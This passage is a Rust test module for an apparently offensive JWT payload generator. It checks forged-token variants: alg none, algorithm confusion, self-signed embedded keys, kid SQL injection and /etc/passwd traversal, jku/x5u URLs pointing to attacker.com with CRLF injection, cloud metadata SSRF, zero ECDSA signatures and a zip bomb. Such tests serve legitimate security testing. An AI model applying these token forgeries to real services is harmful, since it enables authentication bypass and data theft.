                    .contains("victim.com%0d0aHost: attacker.com")
            }),
            "Bypass payload with CRLF not found"
        );
    }

    #[test]
    fn test_generate_url_payload_invalid_token_format() {
        // For "invalid.token", parts are ["invalid", "token"]. len is 2. generate_url_payload should work.
        let result = generate_url_payload("invalid.token", "jku", "attacker.com", None, "http");
        assert!(
            result.is_ok(),
            "Expected Ok for token 'invalid.token', got {:?}",
            result.err()
        );

        // Test with a single part token, which should fail
        let result_single_part =
            generate_url_payload("invalidtoken", "jku", "attacker.com", None, "http");
        assert!(
            result_single_part.is_err(),
            "Expected error for single part token in generate_url_payload"
        );
    }

    #[test]
    fn test_generate_alg_confusion_payload() {
        let result = generate_alg_confusion_payload(DUMMY_TOKEN, None);
        assert!(result.is_ok());
        let payloads = result.unwrap();
        assert!(!payloads.is_empty());

        // Check that the algorithm has been changed to HS256
        let header = get_header_from_token(&payloads[0])
            .expect("Failed to decode header from alg confusion payload");
        assert_eq!(
            header.get("alg").unwrap().as_str().unwrap().to_lowercase(),
            "hs256"
        );
    }

    #[test]
    fn test_generate_kid_sql_payload() {
        let result = generate_kid_sql_payload(DUMMY_TOKEN);
        assert!(result.is_ok());
        let payloads = result.unwrap();
        assert!(!payloads.is_empty());

        // Check that at least one payload contains a SQL injection pattern
        assert!(payloads.iter().any(|p| {
            let header = get_header_from_token(p).unwrap();
            let kid = header.get("kid").unwrap().as_str().unwrap();
            kid.contains("'") || kid.contains("UNION") || kid.contains("--")
        }));
    }

    #[test]
    fn test_generate_x5c_payload() {
        let result = generate_x5c_payload(DUMMY_TOKEN);
        assert!(result.is_ok());
        let payloads = result.unwrap();
        assert!(!payloads.is_empty());

        // Check that all payloads contain an x5c header
        assert!(payloads.iter().all(|p| {
            let header = get_header_from_token(p).unwrap();
            header.as_object().unwrap().contains_key("x5c")
        }));
    }

    #[test]
    fn test_generate_cty_payload() {
        let result = generate_cty_payload(DUMMY_TOKEN);
        assert!(result.is_ok());
        let payloads = result.unwrap();
        assert!(!payloads.is_empty());

        // Check for specific content types
        assert!(payloads.iter().any(|p| {
            let header = get_header_from_token(p).unwrap();
            header.get("cty").unwrap().as_str().unwrap() == "text/xml"
        }));

        assert!(payloads.iter().any(|p| {
            let header = get_header_from_token(p).unwrap();
            header.get("cty").unwrap().as_str().unwrap() == "application/x-java-serialized-object"
        }));
    }

    #[test]
    fn test_generate_all_payloads_basic() {
        let result = generate_all_payloads(DUMMY_TOKEN, None, None, "http", None);
        assert!(result.is_ok());
        let payloads = result.unwrap();
        // Expected: "none", "NonE", "NONE" + new attack payloads
        assert!(
            payloads.len() >= 3,
            "Expected at least 3 'none' algorithm payloads"
        );
        assert!(payloads.iter().any(|p| {
            let header = get_header_from_token(p).unwrap();
            header.get("alg").unwrap().as_str().unwrap().to_lowercase() == "none"
        }));
    }

    #[test]
    fn test_generate_all_payloads_with_url_attacks() {
        let result = generate_all_payloads(
            DUMMY_TOKEN,
            Some("victim.com"),
            Some("attacker.com"),
            "https",
            None,
        );
        assert!(
            result.is_ok(),
            "generate_all_payloads failed: {:?}",
            result.err()
        );
        let payloads = result.unwrap();

        // Make sure we get a substantial number of payloads including the new attack types
        assert!(payloads.len() > 11);

        assert!(
            payloads.iter().any(|p| {
                let header = get_header_from_token(p).unwrap();
                header.get("alg").unwrap().as_str().unwrap().to_lowercase() == "none"
            }),
            "No 'none' payloads found"
        );

        assert!(
            payloads.iter().any(|p| get_header_from_token(p)
                .unwrap()
                .as_object()
                .unwrap()
                .contains_key("jku")),
            "No JKU payloads found"
        );
        assert!(
            payloads.iter().any(|p| get_header_from_token(p)
                .unwrap()
                .as_object()
                .unwrap()
                .contains_key("x5u")),
            "No X5U payloads found"
        );

        // Check if at least one JKU payload has the trust domain bypass
        assert!(
            payloads.iter().any(|p| {
                let header_val = get_header_from_token(p).unwrap();
                let header = header_val.as_object().unwrap();
                header.contains_key("jku")
                    && header
                        .get("jku")
                        .unwrap()
                        .as_str()
                        .unwrap()
                        .contains("victim.com")
            }),
            "No JKU bypass payload with victim.com found"
        );

        // Check if at least one X5U payload has the trust domain bypass
        assert!(
            payloads.iter().any(|p| {
                let header_val = get_header_from_token(p).unwrap();
                let header = header_val.as_object().unwrap();
                header.contains_key("x5u")
                    && header
                        .get("x5u")
                        .unwrap()
                        .as_str()
                        .unwrap()
                        .contains("victim.com")
            }),
            "No X5U bypass payload with victim.com found"
        );
    }

    #[test]
    fn test_generate_all_payloads_with_target() {
        // Test with only 'none' target
        let result = generate_all_payloads(
            DUMMY_TOKEN,
            Some("victim.com"),
            Some("attacker.com"),
            "https",
            Some("none"),
        );
        assert!(result.is_ok());
        let payloads = result.unwrap();
        assert_eq!(
            payloads.len(),
            3,
            "Expected only 3 'none' algorithm payloads"
        );
        assert!(payloads.iter().all(|p| {
            let header = get_header_from_token(p).unwrap();
            header.get("alg").unwrap().as_str().unwrap().to_lowercase() == "none"
        }));

        // Test with only 'jku' target
        let result = generate_all_payloads(
            DUMMY_TOKEN,
            Some("victim.com"),
            Some("attacker.com"),
            "https",
            Some("jku"),
        );
        assert!(result.is_ok());
        let payloads = result.unwrap();
        assert_eq!(payloads.len(), 4, "Expected 4 JKU payloads");
        assert!(payloads.iter().all(|p| {
            let header = get_header_from_token(p).unwrap();
            header.as_object().unwrap().contains_key("jku")
        }));
        assert!(!payloads.iter().any(|p| {
            let header = get_header_from_token(p).unwrap();
            header.as_object().unwrap().contains_key("x5u")
        }));

        // Test with combined targets
        let result = generate_all_payloads(
            DUMMY_TOKEN,
            Some("victim.com"),
            Some("attacker.com"),
            "https",
            Some("none,x5u"),
        );
        assert!(result.is_ok());
        let payloads = result.unwrap();
        assert_eq!(
            payloads.len(),
            3 + 4,
            "Expected 3 'none' + 4 'x5u' payloads"
        );
        assert!(payloads.iter().any(|p| {
            let header = get_header_from_token(p).unwrap();
            header.get("alg").unwrap().as_str().unwrap().to_lowercase() == "none"
        }));
        assert!(payloads.iter().any(|p| {
            let header = get_header_from_token(p).unwrap();
            header.as_object().unwrap().contains_key("x5u")
        }));
        assert!(!payloads.iter().any(|p| {
            let header = get_header_from_token(p).unwrap();
            header.as_object().unwrap().contains_key("jku")
        }));

        // Test with new attack types
        let result = generate_all_payloads(
            DUMMY_TOKEN,
            None,
            None,
            "http",
            Some("alg_confusion,kid_sql"),
        );
        assert!(result.is_ok());
        let payloads = result.unwrap();

        // Check for alg_confusion payloads
        assert!(payloads.iter().any(|p| {
            if let Some(header) = get_header_from_token(p) {
                if let Some(alg) = header.get("alg") {
                    if let Some(alg_str) = alg.as_str() {
                        return alg_str.to_lowercase() == "hs256";
                    }
                }
            }
            false
        }));

        // Check for kid_sql payloads
        assert!(payloads.iter().any(|p| {
            if let Some(header) = get_header_from_token(p) {
                if let Some(kid) = header.get("kid") {
                    if let Some(kid_str) = kid.as_str() {
                        return kid_str.contains("'")
                            || kid_str.contains("UNION")
                            || kid_str.contains("--");
                    }
                }
            }
            false
        }));
    }

    #[test]
    fn test_generate_jwk_embed_payload_signature_verifies() {
        // Generate the payload, then use the embedded public key to verify the signature.
        let token = generate_jwk_embed_payload(DUMMY_TOKEN).expect("jwk_embed should succeed");
        let parts: Vec<&str> = token.split('.').collect();
        assert_eq!(parts.len(), 3, "expected 3-part token");

        let header = get_header_from_token(&token).expect("decode header");
        let jwk = header.get("jwk").expect("jwk header present");
        assert_eq!(jwk.get("kty").unwrap().as_str(), Some("RSA"));
        let n_b64 = jwk.get("n").unwrap().as_str().unwrap();
        let e_b64 = jwk.get("e").unwrap().as_str().unwrap();

        // Reconstruct the public key from the embedded n/e and verify the signature.
        use jsonwebtoken::{Algorithm, DecodingKey, Validation};
        let n_bytes = URL_SAFE_NO_PAD.decode(n_b64).unwrap();
        let e_bytes = URL_SAFE_NO_PAD.decode(e_b64).unwrap();
        let key = DecodingKey::from_rsa_raw_components(&n_bytes, &e_bytes);
        let mut validation = Validation::new(Algorithm::RS256);
        validation.validate_exp = false;
        validation.required_spec_claims.clear();
        // Use jsonwebtoken::decode to verify signature against the embedded key.
        let result = jsonwebtoken::decode::<serde_json::Value>(&token, &key, &validation);
        assert!(
            result.is_ok(),
            "signature should verify against the embedded jwk: {:?}",
            result.err()
        );
    }

    #[test]
    fn test_generate_kid_traversal_signed_with_empty_secret() {
        let payloads =
            generate_kid_traversal_payload(DUMMY_TOKEN).expect("kid_traversal should succeed");
        assert!(!payloads.is_empty());

        // Every payload should HS256-verify against an empty secret.
        for p in &payloads {
            let parts: Vec<&str> = p.split('.').collect();
            assert_eq!(parts.len(), 3, "kid_traversal payload must be 3-part");
            let signing_input = format!("{}.{}", parts[0], parts[1]);
            let expected = hmac_sha256::HMAC::mac(signing_input.as_bytes(), b"");
            let expected_b64 = URL_SAFE_NO_PAD.encode(expected.as_slice());
            assert_eq!(
                parts[2], expected_b64,
                "HS256 signature with empty secret must match for payload {p}"
            );
        }

        // /dev/null and /etc/passwd patterns must be represented.
        let kids: Vec<String> = payloads
            .iter()
            .filter_map(|p| {
                get_header_from_token(p)
                    .and_then(|h| h.get("kid").and_then(|v| v.as_str().map(String::from)))
            })
            .collect();
        assert!(kids.iter().any(|k| k == "/dev/null"));
        assert!(kids.iter().any(|k| k.contains("etc/passwd")));
    }

    #[test]
    fn test_generate_alg_confusion_picks_matching_hmac_family() {
        // Build a synthetic source token per alg, check the downgrade target.
        for (source, expected) in [
            ("RS256", "HS256"),
            ("RS384", "HS384"),
            ("RS512", "HS512"),
            ("PS384", "HS384"),
            ("ES512", "HS512"),
            ("EdDSA", "HS256"),
        ] {
            let header = json!({ "alg": source, "typ": "JWT" });
            let header_b64 =
                URL_SAFE_NO_PAD.encode(serde_json::to_string(&header).unwrap().as_bytes());
            let token = format!("{}.eyJzdWIiOiJ4In0.sig", header_b64);
            let payloads = generate_alg_confusion_payload(&token, None).unwrap();
            // First payload is the HMAC downgrade, second is `none`.
            assert!(payloads.len() >= 2);
            let hmac_hdr = get_header_from_token(&payloads[0]).expect("hmac header should decode");
            assert_eq!(
                hmac_hdr.get("alg").unwrap().as_str(),
                Some(expected),
                "{} should downgrade to {}",
                source,
                expected
            );
            let none_hdr = get_header_from_token(&payloads[1]).expect("none header should decode");
            assert_eq!(none_hdr.get("alg").unwrap().as_str(), Some("none"));
        }
    }

    #[test]
    fn test_generate_alg_confusion_with_public_key_produces_signed_hs256() {
        // Provide arbitrary "public key" bytes; HS256 token must verify with those bytes.
        let pem = "-----BEGIN PUBLIC KEY-----\nFAKE\n-----END PUBLIC KEY-----\n";
        let payloads = generate_alg_confusion_payload(DUMMY_TOKEN, Some(pem)).unwrap();
        let signed = &payloads[0]; // HS256 downgrade
        let parts: Vec<&str> = signed.split('.').collect();
        assert_eq!(parts.len(), 3);
        let input = format!("{}.{}", parts[0], parts[1]);
        let expected = hmac_sha256::HMAC::mac(input.as_bytes(), pem.as_bytes());
        let expected_b64 = URL_SAFE_NO_PAD.encode(expected.as_slice());
        assert_eq!(parts[2], expected_b64);
    }

    #[test]
    fn test_generate_empty_sig_payload_variants() {
        let payloads = generate_empty_sig_payload(DUMMY_TOKEN).expect("ok");
        assert_eq!(payloads.len(), 3);
        assert!(payloads.iter().any(|p| p.ends_with('.')));
        assert!(payloads.iter().any(|p| p.ends_with(".null")));
        // The no-trailing-dot variant has 2 dots only? No — it's 1 dot, header.payload.
        assert!(payloads.iter().any(|p| p.matches('.').count() == 1));
    }

    #[test]
    fn test_generate_crit_and_b64_payloads_emit_expected_headers() {
        let crit = generate_crit_payload(DUMMY_TOKEN).expect("crit ok");
        assert!(crit.iter().all(|p| {
            get_header_from_token(p)
                .and_then(|h| h.get("crit").cloned())
                .is_some()
        }));

        let b64 = generate_b64_payload(DUMMY_TOKEN).expect("b64 ok");
        assert!(b64.iter().all(|p| {
            get_header_from_token(p).and_then(|h| h.get("b64").and_then(|v| v.as_bool()))
                == Some(false)
        }));
    }

    #[test]
    fn test_generate_psychic_signature_zero_sigs() {
        let payloads = generate_psychic_signature_payload(DUMMY_TOKEN).expect("psychic ok");
        assert_eq!(payloads.len(), 3);

        let expected_lens = [("ES256", 64usize), ("ES384", 96), ("ES512", 132)];
        for (p, (alg, len)) in payloads.iter().zip(expected_lens.iter()) {
            let parts: Vec<&str> = p.split('.').collect();
            assert_eq!(parts.len(), 3);
            let header = get_header_from_token(p).unwrap();
            assert_eq!(header.get("alg").unwrap().as_str(), Some(*alg));
            let sig = URL_SAFE_NO_PAD.decode(parts[2]).unwrap();
            assert_eq!(sig.len(), *len);
            assert!(sig.iter().all(|b| *b == 0));
        }
    }

    #[test]
    fn test_generate_typ_confusion_variants() {
        let payloads = generate_typ_confusion_payload(DUMMY_TOKEN).expect("typ ok");
        // At least the documented variants are present.
        let typ_values: Vec<Option<String>> = payloads
            .iter()
            .map(|p| {
                get_header_from_token(p)
                    .and_then(|h| h.get("typ").and_then(|v| v.as_str().map(String::from)))
            })
            .collect();
        assert!(typ_values.contains(&Some("at+jwt".to_string())));
        assert!(typ_values.contains(&Some("JOSE".to_string())));
        assert!(typ_values.contains(&None), "one variant must omit typ");
    }

    #[test]
    fn test_generate_alg_edge_variants() {
        let payloads = generate_alg_edge_payload(DUMMY_TOKEN).expect("alg edge ok");
        // Empty string, null, and an array variant must each appear.
        let algs: Vec<serde_json::Value> = payloads
            .iter()
            .filter_map(|p| get_header_from_token(p).and_then(|h| h.get("alg").cloned()))
            .collect();
        assert!(algs
            .iter()
            .any(|v| v == &serde_json::Value::String(String::new())));
        assert!(algs.iter().any(|v| v == &serde_json::Value::Null));
        assert!(algs.iter().any(|v| v.is_array()));
    }

    #[test]
    fn test_generate_jku_x5u_ssrf_emits_both_keys_and_imds() {
        let payloads = generate_jku_x5u_ssrf_payload(DUMMY_TOKEN).expect("ssrf ok");
        let mut saw_jku_imds = false;
        let mut saw_x5u_imds = false;
        for p in &payloads {
            let h = get_header_from_token(p).unwrap();
            if let Some(u) = h.get("jku").and_then(|v| v.as_str()) {
                if u.contains("169.254.169.254") {
                    saw_jku_imds = true;
                }
            }
            if let Some(u) = h.get("x5u").and_then(|v| v.as_str()) {
                if u.contains("169.254.169.254") {
                    saw_x5u_imds = true;
                }
            }
        }
        assert!(saw_jku_imds, "expected jku payload with IMDS URL");
        assert!(saw_x5u_imds, "expected x5u payload with IMDS URL");
    }

    #[test]
    fn test_generate_zip_payload_bomb_decompresses_large() {
        let payloads = generate_zip_payload(DUMMY_TOKEN).expect("zip ok");
        // The bomb variant should have zip=DEF and a small encoded claims part
        // that decompresses to substantially more bytes than the raw segment.
        let bomb = payloads
            .iter()
            .find(|p| {
                let h = get_header_from_token(p).unwrap();
                h.get("zip").and_then(|v| v.as_str()) == Some("DEF")
            })
            .expect("bomb variant present");
        let parts: Vec<&str> = bomb.split('.').collect();
        let claims_compressed = URL_SAFE_NO_PAD.decode(parts[1]).unwrap();
        let decompressed =
            crate::utils::compression::decompress_deflate(&claims_compressed).unwrap();
        assert!(
            decompressed.len() > claims_compressed.len() * 50,
            "bomb should expand >50x: compressed={}, decompressed={}",
            claims_compressed.len(),
            decompressed.len()
        );
    }

    #[test]
    fn test_generate_kid_predictable_signs_with_provided_secret() {
        let secret = b"body{color:red}";
        let payloads =
            generate_kid_predictable_payload(DUMMY_TOKEN, Some(secret)).expect("kid pred ok");
        assert!(!payloads.is_empty());
        for p in &payloads {
            let parts: Vec<&str> = p.split('.').collect();
            assert_eq!(parts.len(), 3);
            let input = format!("{}.{}", parts[0], parts[1]);
            let expected = hmac_sha256::HMAC::mac(input.as_bytes(), secret);
            let expected_b64 = URL_SAFE_NO_PAD.encode(expected.as_slice());
            assert_eq!(parts[2], expected_b64);
        }
    }

    #[test]
    fn test_generate_x5c_signed_payload_verifies_against_embedded_cert() {
        use jsonwebtoken::{Algorithm, DecodingKey, Validation};
        let token = generate_x5c_signed_payload(DUMMY_TOKEN).expect("x5c signed ok");
        let header = get_header_from_token(&token).expect("header");
        let x5c = header.get("x5c").unwrap().as_array().unwrap();
        let cert_b64 = x5c[0].as_str().unwrap();
        // x5c is standard base64, not URL-safe.
        let cert_der = base64::engine::general_purpose::STANDARD
            .decode(cert_b64)
            .unwrap();

        // Parse the cert with openssl and grab the public key as PEM.
        let cert = openssl::x509::X509::from_der(&cert_der).unwrap();
        let pubkey_pem = cert.public_key().unwrap().public_key_to_pem().unwrap();

        let key = DecodingKey::from_rsa_pem(&pubkey_pem).unwrap();
        let mut v = Validation::new(Algorithm::RS256);
        v.validate_exp = false;
        v.required_spec_claims.clear();
        let result = jsonwebtoken::decode::<serde_json::Value>(&token, &key, &v);
        assert!(
            result.is_ok(),
            "signature should verify with the embedded cert's key: {:?}",
            result.err()
        );
    }
}
